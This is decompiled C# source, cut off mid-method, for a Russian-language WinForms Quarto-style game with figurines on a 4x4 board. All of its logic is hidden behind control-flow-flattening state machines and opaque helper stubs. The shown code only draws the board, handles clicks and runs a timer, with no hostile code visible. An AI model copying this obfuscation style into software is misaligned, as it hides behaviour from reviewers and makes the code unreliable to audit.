using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			Dark = dark;
			Big = big;
			Square = square;
			Point = point;
		}

		public Figurine(Figurine copy)
		{
			while (true)
			{
				int num = -1664750215;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xB39E2E50u) % 5u)
					{
					case 4u:
						num = ((int)num2 * -2098689825) ^ 0x27FF80DE;
						continue;
					case 3u:
						Dark = copy.Dark;
						Big = copy.Big;
						num = (int)(num2 * 1678799983) ^ -701334272;
						continue;
					case 0u:
						Square = copy.Square;
						Point = copy.Point;
						num = (int)((num2 * 334233317) ^ 0x67326506);
						continue;
					default:
						return;
					case 2u:
						break;
					case 1u:
						return;
					}
					break;
				}
			}
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_020f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0219: Expected O, but got Unknown
		int num3 = default(int);
		int num5 = default(int);
		double num7 = default(double);
		while (true)
		{
			int num = 165363437;
			while (true)
			{
				uint num2;
				double num4;
				switch ((num2 = (uint)num ^ 0x7CF7AF71u) % 22u)
				{
				case 21u:
					num = (int)((num2 * 1594760969) ^ 0x6361CDC1);
					continue;
				case 20u:
					num3++;
					num = (int)((num2 * 1507204526) ^ 0x509D815F);
					continue;
				case 19u:
					num = ((int)num2 * -155726017) ^ -1696788234;
					continue;
				case 17u:
				{
					int num6;
					if (num5 >= 4)
					{
						num = 561297585;
						num6 = 561297585;
					}
					else
					{
						num = 200219268;
						num6 = 200219268;
					}
					continue;
				}
				case 16u:
					num = (int)((num2 * 577668983) ^ 0x245E05C7);
					continue;
				case 15u:
					num3 = 0;
					num = 1797167527;
					continue;
				case 14u:
				{
					int num12;
					if (num3 >= 4)
					{
						num = 1015653246;
						num12 = 1015653246;
					}
					else
					{
						num = 385508067;
						num12 = 385508067;
					}
					continue;
				}
				case 13u:
					borderBox = new PictureBox[4, 4];
					num = (int)((num2 * 2030388526) ^ 0x461F8AB1);
					continue;
				case 12u:
					Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
					num = ((int)num2 * -1724623479) ^ -685180814;
					continue;
				case 11u:
				{
					PictureBox[,] array2 = borderBox;
					int num10 = num5;
					int num11 = num3;
					PictureBox obj2 = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
					Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)num3 + num7) * (double)size), 1 + num5 * size));
					Form1.smethod_7((Control)(object)obj2, bool_0: false);
					array2[num10, num11] = obj2;
					num = ((int)num2 * -1509065712) ^ 0x4FEEBF2C;
					continue;
				}
				case 10u:
					InitializeComponent();
					num = (int)(num2 * 879557085) ^ -259813050;
					continue;
				case 9u:
					num5++;
					num = (int)(num2 * 416140527) ^ -219212445;
					continue;
				case 8u:
				{
					PictureBox[,] array = pictureBox;
					int num8 = num5;
					int num9 = num3;
					PictureBox obj = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
					Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)num3 + num7) * (double)size), 4 + num5 * size));
					Form1.smethod_5((Control)(object)obj, Color.White);
					array[num8, num9] = obj;
					Form1.smethod_6((Control)(object)pictureBox[num5, num3], new MouseEventHandler(PictureBoxIJ_MouseDown));
					num = (int)((num2 * 1123188887) ^ 0x4C731CC0);
					continue;
				}
				case 7u:
					num = ((int)num2 * -1505673453) ^ -1133428264;
					continue;
				case 6u:
					num5 = 0;
					num = ((int)num2 * -2020723854) ^ -1748324546;
					continue;
				case 5u:
					num4 = 4.1;
					goto IL_025d;
				case 3u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[num5, num3]);
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[num5, num3]);
					num = ((int)num2 * -775377209) ^ -46109513;
					continue;
				case 2u:
				{
					Form3 form_ = new Form3();
					Form1.smethod_10((Form)(object)form_, (Form)(object)this);
					menu = (Form)(object)form_;
					Form1.smethod_11((Control)(object)menu);
					num = (int)((num2 * 1103555503) ^ 0x5B71511B);
					continue;
				}
				case 1u:
					pictureBox = new PictureBox[4, 4];
					num = (int)(num2 * 1877472118) ^ -1111055972;
					continue;
				case 0u:
					if (num3 >= 2)
					{
						num = 1287292242;
						continue;
					}
					num4 = 0.0;
					goto IL_025d;
				default:
					return;
				case 18u:
					break;
				case 4u:
					return;
					IL_025d:
					num7 = num4;
					num = 966632765;
					continue;
				}
				break;
			}
		}
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		Form1.smethod_15(timer1);
		bool flag = default(bool);
		while (true)
		{
			int num = -1923000725;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xBC8145B0u) % 10u)
				{
				case 9u:
					flag = Form1.smethod_16((Control)(object)menu) < 296;
					num = -1164033932;
					continue;
				case 8u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 150003644;
						num4 = 150003644;
					}
					else
					{
						num3 = 964898565;
						num4 = 964898565;
					}
					num = num3 ^ ((int)num2 * -1510818766);
					continue;
				}
				case 7u:
					num = (int)(num2 * 1295511622) ^ -276949655;
					continue;
				case 6u:
					num = ((int)num2 * -64634607) ^ -1867131251;
					continue;
				case 4u:
					Form1.smethod_14(menu);
					num = ((int)num2 * -54423354) ^ 0x41CA383;
					continue;
				case 3u:
					num = -931526746;
					continue;
				case 1u:
					num = (int)(num2 * 1486991274) ^ -1006445725;
					continue;
				case 0u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = (int)(num2 * 1082917940) ^ -1914711992;
					continue;
				}
				default:
					return;
				case 2u:
					break;
				case 5u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int num6 = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -187740621;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xC215FAB0u) % 20u)
				{
				case 19u:
					Paint_Storage();
					num = ((int)num2 * -1219663114) ^ -1469708112;
					continue;
				case 18u:
					num6 = 0;
					num = -1644721731;
					continue;
				case 17u:
					storage[num3, num6] = new Figurine(num3 < 2, num6 % 2 == 0, num6 < 2, num3 % 2 == 1);
					Form1.smethod_5((Control)(object)borderBox[num3, num6], Color.White);
					Form1.smethod_7((Control)(object)pictureBox[num3, num6], bool_0: false);
					num = ((int)num2 * -618413719) ^ -2097399909;
					continue;
				case 16u:
					num = (int)((num2 * 31049589) ^ 0x3C5F9BD9);
					continue;
				case 15u:
					num = ((int)num2 * -1469743534) ^ -1184725568;
					continue;
				case 14u:
				{
					int num7;
					if (num3 >= 4)
					{
						num = -1197092952;
						num7 = -1197092952;
					}
					else
					{
						num = -769890994;
						num7 = -769890994;
					}
					continue;
				}
				case 11u:
					flag = num6 < 4;
					num = -447783764;
					continue;
				case 10u:
					num6++;
					num = (int)(num2 * 1047571624) ^ -1382003025;
					continue;
				case 9u:
					num = (int)((num2 * 886745402) ^ 0x3AB9D1ED);
					continue;
				case 8u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = 1797222771;
						num5 = 1797222771;
					}
					else
					{
						num4 = 1365756497;
						num5 = 1365756497;
					}
					num = num4 ^ (int)(num2 * 248075388);
					continue;
				}
				case 7u:
					num = -1848342379;
					continue;
				case 6u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)(num2 * 29749196) ^ -453301248;
					continue;
				case 5u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)(num2 * 973073920) ^ -643113345;
					continue;
				case 4u:
					num = (int)((num2 * 590221602) ^ 0x7D0A1899);
					continue;
				case 3u:
					board = new Figurine[4, 4];
					storage = new Figurine[4, 4];
					num3 = 0;
					num = ((int)num2 * -227121584) ^ -1706022058;
					continue;
				case 2u:
					num = ((int)num2 * -1938554662) ^ 0x20DAD283;
					continue;
				case 1u:
					num3++;
					num = (int)((num2 * 383353630) ^ 0x3DF3E798);
					continue;
				case 0u:
					Paint_Board();
					num = (int)(num2 * 1718138437) ^ -1449890760;
					continue;
				default:
					return;
				case 12u:
					break;
				case 13u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		int num3 = default(int);
		int num4 = default(int);
		float num5 = default(float);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num13 = default(float);
		float num14 = default(float);
		bool square = default(bool);
		bool big = default(bool);
		float num6 = default(float);
		bool point = default(bool);
		bool dark = default(bool);
		float num7 = default(float);
		while (true)
		{
			int num = 782625255;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x73E14C5Bu) % 40u)
				{
				case 39u:
					num = ((int)num2 * -2085773705) ^ -1470317588;
					continue;
				case 38u:
				{
					int num18;
					int num19;
					if (board[num3, num4] != null)
					{
						num18 = -1331506191;
						num19 = -1331506191;
					}
					else
					{
						num18 = -880472131;
						num19 = -880472131;
					}
					num = num18 ^ (int)(num2 * 264173719);
					continue;
				}
				case 37u:
				{
					int num17;
					if (num4 < 4)
					{
						num = 696850120;
						num17 = 696850120;
					}
					else
					{
						num = 2122785621;
						num17 = 2122785621;
					}
					continue;
				}
				case 36u:
					num = ((int)num2 * -809303041) ^ -1567878036;
					continue;
				case 35u:
					num5 = 0.7f;
					num = 25263734;
					continue;
				case 34u:
					Form1.smethod_28(graphics_, brush_, num13 + (float)(num4 * size), num13 + (float)(num3 * size), num14, num14);
					num = (int)(num2 * 1035631764) ^ -1061855747;
					continue;
				case 33u:
				{
					int num11;
					int num12;
					if (square)
					{
						num11 = -502575126;
						num12 = -502575126;
					}
					else
					{
						num11 = -2061307095;
						num12 = -2061307095;
					}
					num = num11 ^ (int)(num2 * 540354819);
					continue;
				}
				case 32u:
					big = board[num3, num4].Big;
					num = 25094839;
					continue;
				case 31u:
					num13 = (float)size * (num6 / 2f);
					num = (int)((num2 * 2056197709) ^ 0x153B2E72);
					continue;
				case 30u:
					num3++;
					num = (int)(num2 * 1466862062) ^ -41755943;
					continue;
				case 29u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -1092303593) ^ -1728207672;
					continue;
				case 28u:
				{
					int num20;
					int num21;
					if (!point)
					{
						num20 = 1229442344;
						num21 = 1229442344;
					}
					else
					{
						num20 = 1981971430;
						num21 = 1981971430;
					}
					num = num20 ^ ((int)num2 * -1251818706);
					continue;
				}
				case 27u:
					dark = board[num3, num4].Dark;
					num = ((int)num2 * -1109158904) ^ -1457192644;
					continue;
				case 26u:
					num14 = num7 * 0.9f / (float)Form1.smethod_27(2.0);
					num = (int)((num2 * 1095752747) ^ 0x663665F5);
					continue;
				case 25u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -676262669) ^ -1770112478;
					continue;
				case 24u:
					num = (int)(num2 * 1101773284) ^ -660897517;
					continue;
				case 23u:
					num4 = 0;
					num = 2056747665;
					continue;
				case 22u:
					num6 = 1f - num5 * 0.4f / (float)Form1.smethod_27(2.0);
					num13 = (float)size * (num6 / 2f);
					num = 1281160110;
					continue;
				case 21u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num13 + (float)(num4 * size), num13 + (float)(num3 * size), num14, num14);
					num = ((int)num2 * -770965401) ^ 0x23EC5C3C;
					continue;
				case 20u:
				{
					int num15;
					int num16;
					if (big)
					{
						num15 = -467012047;
						num16 = -467012047;
					}
					else
					{
						num15 = -1343763720;
						num16 = -1343763720;
					}
					num = num15 ^ ((int)num2 * -1145622228);
					continue;
				}
				case 19u:
					point = board[num3, num4].Point;
					num = ((int)num2 * -762861912) ^ 0x8A7F23F;
					continue;
				case 18u:
					num = ((int)num2 * -1614308165) ^ -11876792;
					continue;
				case 15u:
					brush_ = Form1.smethod_26();
					num = 1673918771;
					continue;
				case 14u:
					num = ((int)num2 * -1631874404) ^ 0x5FCBF79A;
					continue;
				case 13u:
					num14 = num7 * 0.4f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -1410438754) ^ 0x44A26506;
					continue;
				case 12u:
					num4++;
					num = 9034694;
					continue;
				case 11u:
					num = 1714359218;
					continue;
				case 10u:
					num5 = 1f;
					num = ((int)num2 * -1969017446) ^ 0x4D2A9A12;
					continue;
				case 9u:
					Form1.smethod_24(graphics_, brush_, num13 + (float)(num4 * size), num13 + (float)(num3 * size), num14, num14);
					num = 172083732;
					continue;
				case 8u:
					num = ((int)num2 * -215678850) ^ -1650728512;
					continue;
				case 7u:
				{
					int num9;
					int num10;
					if (!dark)
					{
						num9 = -1792857933;
						num10 = -1792857933;
					}
					else
					{
						num9 = -1247175679;
						num10 = -1247175679;
					}
					num = num9 ^ (int)(num2 * 915028793);
					continue;
				}
				case 6u:
				{
					int num8;
					if (num3 < 4)
					{
						num = 832699876;
						num8 = 832699876;
					}
					else
					{
						num = 969668459;
						num8 = 969668459;
					}
					continue;
				}
				case 5u:
					num6 = 1f - num5 * 0.9f / (float)Form1.smethod_27(2.0);
					num7 = (float)size * num5;
					num = 1102904012;
					continue;
				case 4u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = ((int)num2 * -1676258597) ^ -4398831;
					continue;
				case 3u:
					num = 1850976215;
					continue;
				case 2u:
					num3 = 0;
					num = ((int)num2 * -658022334) ^ 0x72C130B9;
					continue;
				case 1u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num4 + 0.05f) * (float)size, ((float)num3 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -675909927) ^ -1963929348;
					continue;
				case 0u:
					square = board[num3, num4].Square;
					num = (int)(num2 * 854410153) ^ -239455150;
					continue;
				case 17u:
					break;
				default:
					Form1.smethod_30((Control)(object)pictureBox1);
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num = 0;
		int num7 = default(int);
		float num6 = default(float);
		Graphics graphics_ = default(Graphics);
		Brush brush_ = default(Brush);
		float num4 = default(float);
		float num5 = default(float);
		float num14 = default(float);
		bool dark = default(bool);
		float num8 = default(float);
		bool flag = default(bool);
		while (true)
		{
			int num2 = -1891509417;
			while (true)
			{
				uint num3;
				switch ((num3 = (uint)num2 ^ 0xEC37793Fu) % 32u)
				{
				case 31u:
					num7 = 0;
					num2 = -1435883597;
					continue;
				case 30u:
				{
					int num17;
					if (num >= 4)
					{
						num2 = -1992464218;
						num17 = -1992464218;
					}
					else
					{
						num2 = -1469708160;
						num17 = -1469708160;
					}
					continue;
				}
				case 29u:
					num6 = 0.7f;
					num2 = -1890477107;
					continue;
				case 28u:
					num2 = (int)(num3 * 1007738748) ^ -680006274;
					continue;
				case 27u:
					num2 = (int)((num3 * 1326708430) ^ 0x3EFD56B9);
					continue;
				case 26u:
					Form1.smethod_28(graphics_, brush_, num4, num4, num5, num5);
					num2 = ((int)num3 * -1947205406) ^ -387459764;
					continue;
				case 24u:
				{
					num5 = num14 * 0.9f / (float)Form1.smethod_27(2.0);
					int num18;
					int num19;
					if (num7 < 2)
					{
						num18 = -186536283;
						num19 = -186536283;
					}
					else
					{
						num18 = -1341088593;
						num19 = -1341088593;
					}
					num2 = num18 ^ ((int)num3 * -580847820);
					continue;
				}
				case 23u:
					brush_ = Form1.smethod_26();
					num2 = -690210582;
					continue;
				case 22u:
					brush_ = Form1.smethod_25();
					num2 = (int)((num3 * 134663384) ^ 0x6D66C67A);
					continue;
				case 21u:
				{
					int num11;
					if (storage[num, num7].Big)
					{
						num2 = -1409910178;
						num11 = -1409910178;
					}
					else
					{
						num2 = -408947134;
						num11 = -408947134;
					}
					continue;
				}
				case 20u:
				{
					int num20;
					if (storage[num, num7] == null)
					{
						num2 = -1929055890;
						num20 = -1929055890;
					}
					else
					{
						num2 = -486821519;
						num20 = -486821519;
					}
					continue;
				}
				case 19u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num, num7]));
					dark = storage[num, num7].Dark;
					num2 = ((int)num3 * -1136538257) ^ 0x5AF6F7A9;
					continue;
				case 18u:
					num8 = 1f - num6 * 0.9f / (float)Form1.smethod_27(2.0);
					num14 = (float)size * num6;
					num4 = (float)size * (num8 / 2f) - 4f;
					num2 = -185600281;
					continue;
				case 17u:
					num7++;
					num2 = -37098660;
					continue;
				case 16u:
					Form1.smethod_24(graphics_, brush_, num4, num4, num5, num5);
					num2 = -1269289224;
					continue;
				case 15u:
					num++;
					num2 = (int)(num3 * 1375558971) ^ -859029964;
					continue;
				case 14u:
					num2 = (int)((num3 * 1344644189) ^ 0x697996C0);
					continue;
				case 13u:
				{
					num5 = num14 * 0.4f / (float)Form1.smethod_27(2.0);
					int num15;
					int num16;
					if (storage[num, num7].Point)
					{
						num15 = -1062702324;
						num16 = -1062702324;
					}
					else
					{
						num15 = -698973906;
						num16 = -698973906;
					}
					num2 = num15 ^ (int)(num3 * 1340951199);
					continue;
				}
				case 12u:
					num2 = (int)(num3 * 1349020311) ^ -1362012216;
					continue;
				case 11u:
				{
					int num12;
					int num13;
					if (dark)
					{
						num12 = -2135981873;
						num13 = -2135981873;
					}
					else
					{
						num12 = -1047598866;
						num13 = -1047598866;
					}
					num2 = num12 ^ ((int)num3 * -879137806);
					continue;
				}
				case 9u:
					Form1.smethod_20(pictureBox[num, num7], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num, num7]), Form1.smethod_16((Control)(object)pictureBox[num, num7])));
					num2 = ((int)num3 * -1423974832) ^ 0x420B70DC;
					continue;
				case 8u:
					num2 = (int)((num3 * 1836787334) ^ 0x309F9371);
					continue;
				case 7u:
					num8 = 1f - num6 * 0.4f / (float)Form1.smethod_27(2.0);
					num2 = -624977062;
					continue;
				case 6u:
				{
					int num9;
					int num10;
					if (flag)
					{
						num9 = 1067248625;
						num10 = 1067248625;
					}
					else
					{
						num9 = 525002378;
						num10 = 525002378;
					}
					num2 = num9 ^ ((int)num3 * -1803969041);
					continue;
				}
				case 5u:
					num4 = (float)size * (num8 / 2f) - 4f;
					num2 = ((int)num3 * -1344576365) ^ 0x192C348D;
					continue;
				case 4u:
					num2 = (int)((num3 * 923590864) ^ 0x5605CC8D);
					continue;
				case 3u:
					flag = num7 < 4;
					num2 = -683557223;
					continue;
				case 2u:
					Form1.smethod_30((Control)(object)pictureBox[num, num7]);
					num2 = -327506364;
					continue;
				case 1u:
					num6 = 1f;
					num2 = ((int)num3 * -1251128679) ^ 0x3E754582;
					continue;
				case 0u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num4, num4, num5, num5);
					num2 = ((int)num3 * -553554734) ^ 0x2EE90B3D;
					continue;
				default:
					return;
				case 10u:
					break;
				case 25u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		Form1_Load(this, Form1.smethod_31());
		bool flag3 = default(bool);
		bool flag2 = default(bool);
		int num3 = default(int);
		int num4 = default(int);
		bool flag = default(bool);
		int num6 = default(int);
		while (true)
		{
			int num = -2065239490;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x953445ACu) % 30u)
				{
				case 29u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -1354552356;
					continue;
				case 28u:
					num = (int)(num2 * 464199806) ^ -1863635929;
					continue;
				case 27u:
					Form1.smethod_36(timer1);
					num = (int)(num2 * 101128093) ^ -1117761257;
					continue;
				case 26u:
					num = (int)((num2 * 1320388465) ^ 0x1DC345E5);
					continue;
				case 25u:
				{
					int num9;
					int num10;
					if (!flag3)
					{
						num9 = -1183180108;
						num10 = -1183180108;
					}
					else
					{
						num9 = -1921615900;
						num10 = -1921615900;
					}
					num = num9 ^ (int)(num2 * 1385800764);
					continue;
				}
				case 24u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					Form1.smethod_35(timer1, bool_0: true);
					num = ((int)num2 * -2062659031) ^ 0xC7B0EC1;
					continue;
				case 23u:
				{
					int num11;
					int num12;
					if (flag2)
					{
						num11 = 1697587686;
						num12 = 1697587686;
					}
					else
					{
						num11 = 391506549;
						num12 = 391506549;
					}
					num = num11 ^ (int)(num2 * 417827788);
					continue;
				}
				case 21u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = ((int)num2 * -895652806) ^ -927094578;
					continue;
				case 20u:
					num = ((int)num2 * -1250257580) ^ -1130140617;
					continue;
				case 19u:
					num3 = 0;
					num = (int)(num2 * 1756732277) ^ -417311770;
					continue;
				case 18u:
					Form1.smethod_7((Control)(object)pictureBox[num3, num4], bool_0: true);
					num4++;
					num = -1051309366;
					continue;
				case 17u:
				{
					int num7;
					int num8;
					if (flag)
					{
						num7 = -1477780018;
						num8 = -1477780018;
					}
					else
					{
						num7 = -1574992863;
						num8 = -1574992863;
					}
					num = num7 ^ (int)(num2 * 1369990955);
					continue;
				}
				case 16u:
					num = (int)((num2 * 1127591844) ^ 0x55C73B73);
					continue;
				case 15u:
					num = ((int)num2 * -215213226) ^ -1745754295;
					continue;
				case 14u:
					flag3 = num4 < 4;
					num = -295070511;
					continue;
				case 13u:
					num6 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 1464952419) ^ 0x15C5834B);
					continue;
				case 12u:
				{
					int num5 = Form1.smethod_33(rnd, 4);
					Form1.smethod_5((Control)(object)borderBox[num6, num5], Color.Blue);
					num = (int)((num2 * 936672537) ^ 0x260183BE);
					continue;
				}
				case 11u:
					num4 = 0;
					num = -734258464;
					continue;
				case 10u:
					num3++;
					num = (int)((num2 * 15493377) ^ 0x6C025F39);
					continue;
				case 9u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = ((int)num2 * -290303083) ^ -1962620447;
					continue;
				case 8u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 253382958) ^ 0x168BF36F);
					continue;
				case 7u:
					flag2 = turn;
					num = (int)((num2 * 151977687) ^ 0x14A1734C);
					continue;
				case 5u:
					num = -1194959605;
					continue;
				case 4u:
					num = ((int)num2 * -927896399) ^ 0x3DFB946;
					continue;
				case 3u:
					flag = num3 < 4;
					num = -487977999;
					continue;
				case 2u:
					step = 1;
					num = (int)(num2 * 1310025069) ^ -459812242;
					continue;
				case 1u:
					step = 0;
					num = ((int)num2 * -1028312413) ^ -827537526;
					continue;
				case 0u:
					num = (int)((num2 * 1978731653) ^ 0x5627E303);
					continue;
				default:
					return;
				case 22u:
					break;
				case 6u:
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		while (true)
		{
			int num = 1647342162;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x7B529D11u) % 4u)
				{
				case 3u:
					time = time.AddSeconds(1.0);
					Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
					num = (int)((num2 * 2050148867) ^ 0x35F26FF0);
					continue;
				case 0u:
					num = (int)((num2 * 1075350413) ^ 0x728B6F9C);
					continue;
				default:
					return;
				case 2u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_00b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ca: Expected O, but got Unknown
		int num = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null)).Y / size;
		bool flag2 = default(bool);
		bool flag4 = default(bool);
		int num8 = default(int);
		int num7 = default(int);
		int num6 = default(int);
		bool flag3 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num2 = 181978252;
			while (true)
			{
				uint num3;
				int num9;
				switch ((num3 = (uint)num2 ^ 0x4D426A7Du) % 24u)
				{
				case 22u:
				{
					int num14;
					int num15;
					if (!flag2)
					{
						num14 = -1385985703;
						num15 = -1385985703;
					}
					else
					{
						num14 = -509235612;
						num15 = -509235612;
					}
					num2 = num14 ^ (int)(num3 * 475208148);
					continue;
				}
				case 21u:
					flag4 = num8 < 4;
					num2 = 800053928;
					continue;
				case 20u:
					num2 = (int)(num3 * 1371643087) ^ -262012596;
					continue;
				case 19u:
					num2 = (int)((num3 * 420965100) ^ 0x40431613);
					continue;
				case 18u:
					num8 = 0;
					num2 = 419242025;
					continue;
				case 17u:
					num7 = 0;
					num2 = ((int)num3 * -1955742223) ^ 0x36CBF70F;
					continue;
				case 16u:
					num9 = ((Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num, num6]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0)) ? 1 : 0);
					goto IL_00d8;
				case 15u:
					num2 = ((int)num3 * -1161612887) ^ 0x2EF3233B;
					continue;
				case 14u:
					num2 = (int)((num3 * 1432908933) ^ 0x3F8B75FF);
					continue;
				case 13u:
				{
					int num12;
					int num13;
					if (flag4)
					{
						num12 = -385460618;
						num13 = -385460618;
					}
					else
					{
						num12 = -1293627252;
						num13 = -1293627252;
					}
					num2 = num12 ^ (int)(num3 * 1096883253);
					continue;
				}
				case 12u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num2 = (int)(num3 * 1292008598) ^ -1884248186;
					continue;
				case 10u:
					flag3 = num7 < 4;
					num2 = 1981064723;
					continue;
				case 9u:
					num6 -= 4;
					num2 = (int)((num3 * 1099614459) ^ 0x4B410CBA);
					continue;
				case 8u:
					num7++;
					num2 = ((int)num3 * -2087727045) ^ -2011790193;
					continue;
				case 7u:
					Form1.smethod_5((Control)(object)borderBox[num, num6], Color.Red);
					num2 = (int)((num3 * 870164543) ^ 0xBD64ED2);
					continue;
				case 6u:
				{
					int num10;
					int num11;
					if (!flag3)
					{
						num10 = 717346100;
						num11 = 717346100;
					}
					else
					{
						num10 = 1077695625;
						num11 = 1077695625;
					}
					num2 = num10 ^ ((int)num3 * -1082524123);
					continue;
				}
				case 5u:
					num8++;
					num2 = (int)(num3 * 167793911) ^ -582906133;
					continue;
				case 4u:
					if (storage[num, num6] != null)
					{
						num2 = 1744388973;
						continue;
					}
					num9 = 0;
					goto IL_00d8;
				case 3u:
					num2 = (int)(num3 * 988638094) ^ -1269791112;
					continue;
				case 2u:
					Form1.smethod_5((Control)(object)borderBox[num7, num8], Color.White);
					num2 = 216523312;
					continue;
				case 1u:
					num6 = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null)).X / size;
					flag2 = num6 > 1;
					num2 = (int)(num3 * 1743591476) ^ -906717801;
					continue;
				case 0u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = 2110941514;
						num5 = 2110941514;
					}
					else
					{
						num4 = 1649594754;
						num5 = 1649594754;
					}
					num2 = num4 ^ (int)(num3 * 1962838782);
					continue;
				}
				default:
					return;
				case 11u:
					break;
				case 23u:
					return;
					IL_00d8:
					flag = (byte)num9 != 0;
					num2 = 495583141;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_0147: Expected O, but got Unknown
		int num5 = default(int);
		int num4 = default(int);
		bool flag = default(bool);
		int num3 = default(int);
		int num7 = default(int);
		Graphics graphics_ = default(Graphics);
		while (true)
		{
			int num = 133739808;
			while (true)
			{
				uint num2;
				int num6;
				switch ((num2 = (uint)num ^ 0x1E9A7619u) % 26u)
				{
				case 25u:
					num5 = Form1.smethod_38(e) / size;
					num = (int)((num2 * 1177164897) ^ 0x2A006AAE);
					continue;
				case 24u:
					num4 = Form1.smethod_39(e) / size;
					num = (int)((num2 * 522210662) ^ 0x2864499B);
					continue;
				case 23u:
					flag = num3 < 4;
					num = 660825272;
					continue;
				case 22u:
					num = (int)((num2 * 678462828) ^ 0x4854B762);
					continue;
				case 21u:
					num = (int)((num2 * 165214108) ^ 0xC6860C5);
					continue;
				case 20u:
					num7 = 0;
					num = (int)(num2 * 629555193) ^ -1326917828;
					continue;
				case 19u:
				{
					int num8;
					if (!(Form1.smethod_41((Control)(object)borderBox[num7, num3]) == Color.Blue))
					{
						num = 832553520;
						num8 = 832553520;
					}
					else
					{
						num = 144564850;
						num8 = 144564850;
					}
					continue;
				}
				case 18u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)((num2 * 1221031176) ^ 0xD307817);
					continue;
				case 16u:
					num = ((int)num2 * -603545254) ^ -420866307;
